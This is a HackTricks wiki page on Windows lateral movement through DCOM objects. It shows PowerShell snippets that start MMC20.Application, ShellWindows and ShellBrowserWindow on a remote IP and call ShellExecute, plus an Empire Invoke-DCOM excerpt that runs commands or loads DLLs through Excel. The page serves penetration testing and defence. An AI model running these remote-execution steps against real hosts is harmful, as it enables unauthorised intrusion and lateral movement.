# DCOM Exec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**DCOM** (Distributed Component Object Model) objects are **interesting** due to the ability to **interact** with the objects **over the network**. Microsoft has some good documentation on DCOM [here](https://msdn.microsoft.com/en-us/library/cc226801.aspx) and on COM [here](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). You can find a solid list of DCOM applications using PowerShell, by running `Get-CimInstance Win32_DCOMApplication`.

The [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) COM object allows you to script components of MMC snap-in operations. While enumerating the different methods and properties within this COM object, I noticed that there is a method named `ExecuteShellCommand` under Document.ActiveView.

![](<../../.gitbook/assets/image (4) (2) (1) (1).png>)

You can read more on that method [here](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). So far, we have a DCOM application that we can access over the network and can execute commands. The final piece is to leverage this DCOM application and the ExecuteShellCommand method to obtain code execution on a remote host.

Fortunately, as an admin, you can remotely interact with DCOM with PowerShell by using “`[activator]::CreateInstance([type]::GetTypeFromProgID`”. All you need to do is provide it a DCOM ProgID and an IP address. It will then provide you back an instance of that COM object remotely:

![](<../../.gitbook/assets/image (665).png>)

It is then possible to invoke the `ExecuteShellCommand` method to start a process on the remote host:

![](<../../.gitbook/assets/image (1) (4) (1).png>)

## ShellWindows & ShellBrowserWindow

The **MMC20.Application** object lacked explicit “[LaunchPermissions](https://technet.microsoft.com/en-us/library/bb633148.aspx)”, resulting in the default permission set allowing Administrators access:

![](<../../.gitbook/assets/image (4) (1) (2).png>)

You can read more on that thread [here](https://twitter.com/tiraniddo/status/817532039771525120).\
Viewing which other objects that have no explicit LaunchPermission set can be achieved using [@tiraniddo](https://twitter.com/tiraniddo)’s [OleView .NET](https://github.com/tyranid/oleviewdotnet), which has excellent Python filters (among other things). In this instance, we can filter down to all objects that have no explicit Launch Permission. When doing so, two objects stood out to me: `ShellBrowserWindow` and `ShellWindows`:

![](<../../.gitbook/assets/image (3) (1) (1) (2).png>)

Another way to identify potential target objects is to look for the value `LaunchPermission` missing from keys in `HKCR:\AppID\{guid}`. An object with Launch Permissions set will look like below, with data representing the ACL for the object in Binary format:

![](https://enigma0x3.files.wordpress.com/2017/01/launch\_permissions\_registry.png?w=690\&h=169)

Those with no explicit LaunchPermission set will be missing that specific registry entry.

### ShellWindows

The first object explored was [ShellWindows](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773974\(v=vs.85\).aspx). Since there is no [ProgID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms688254\(v=vs.85\).aspx) associated with this object, we can use the [Type.GetTypeFromCLSID](https://msdn.microsoft.com/en-us/library/system.type.gettypefromclsid\(v=vs.110\).aspx) .NET method paired with the[ Activator.CreateInstance](https://msdn.microsoft.com/en-us/library/system.activator.createinstance\(v=vs.110\).aspx) method to instantiate the object via its AppID on a remote host. In order to do this, we need to get the [CLSID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms691424\(v=vs.85\).aspx) for the ShellWindows object, which can be accomplished using OleView .NET as well:

![shellwindow\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellwindow\_classid.png?w=434\&h=424)

As you can see below, the “Launch Permission” field is blank, meaning no explicit permissions are set.

![screen-shot-2017-01-23-at-4-12-24-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-12-24-pm.png?w=455\&h=401)

Now that we have the CLSID, we can instantiate the object on a remote target:

```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>") #9BA05972-F6A8-11CF-A442-00A0C90A8F39
$obj = [System.Activator]::CreateInstance($com)
```

![](https://enigma0x3.files.wordpress.com/2017/01/remote\_instantiation\_shellwindows.png?w=690\&h=354)

With the object instantiated on the remote host, we can interface with it and invoke any methods we want. The returned handle to the object reveals several methods and properties, none of which we can interact with. In order to achieve actual interaction with the remote host, we need to access the [WindowsShell.Item](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773970\(v=vs.85\).aspx) method, which will give us back an object that represents the Windows shell window:

```
$item = $obj.Item()
```

![](https://enigma0x3.files.wordpress.com/2017/01/item\_instantiation.png?w=416\&h=465)

With a full handle on the Shell Window, we can now access all of the expected methods/properties that are exposed. After going through these methods, **`Document.Application.ShellExecute`** stood out. Be sure to follow the parameter requirements for the method, which are documented [here](https://msdn.microsoft.com/en-us/library/windows/desktop/gg537745\(v=vs.85\).aspx).

```powershell
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

![](https://enigma0x3.files.wordpress.com/2017/01/shellwindows\_command\_execution.png?w=690\&h=426)

As you can see above, our command was executed on a remote host successfully.

### ShellBrowserWindow

This particular object does not exist on Windows 7, making its use for lateral movement a bit more limited than the “ShellWindows” object, which I tested on Win7-Win10 successfully.

Based on my enumeration of this object, it appears to effectively provide an interface into the Explorer window just as the previous object does. To instantiate this object, we need to get its CLSID. Similar to above, we can use OleView .NET:

![shellbrowser\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellbrowser\_classid.png?w=428\&h=414)

Again, take note of the blank Launch Permission field:

![screen-shot-2017-01-23-at-4-13-52-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-13-52-pm.png?w=399\&h=340)

With the CLSID, we can repeat the steps taken on the previous object to instantiate the object and call the same method:

```powershell
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "<IP>")
$obj = [System.Activator]::CreateInstance($com)

$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\system32", $null, 0)
```

![](https://enigma0x3.files.wordpress.com/2017/01/shellbrowserwindow\_command\_execution.png?w=690\&h=441)

As you can see, the command successfully executed on the remote target.

Since this object interfaces directly with the Windows shell, we don’t need to invoke the “ShellWindows.Item” method, as on the previous object.

While these two DCOM objects can be used to run shell commands on a remote host, there are plenty of other interesting methods that can be used to enumerate or tamper with a remote target. A few of these methods include:

* `Document.Application.ServiceStart()`
* `Document.Application.ServiceStop()`
* `Document.Application.IsServiceRunning()`
* `Document.Application.ShutDownWindows()`
* `Document.Application.GetSystemInformation()`

## ExcelDDE & RegisterXLL

In a similar way it's possible to move laterally abusing DCOM Excel objects, for more information read [https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)

```powershell
# Chunk of code from https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
## You can see here how to abuse excel for RCE
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

## Tool

The Powershell script [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) allows to easily invoke all the commented ways to execute code in other machines.

## References

* The first method was copied from [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/), for more info follow the link
* The second section was copied from [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/), for more info follow the link

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Find vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems. [**Try it for free**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) today.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
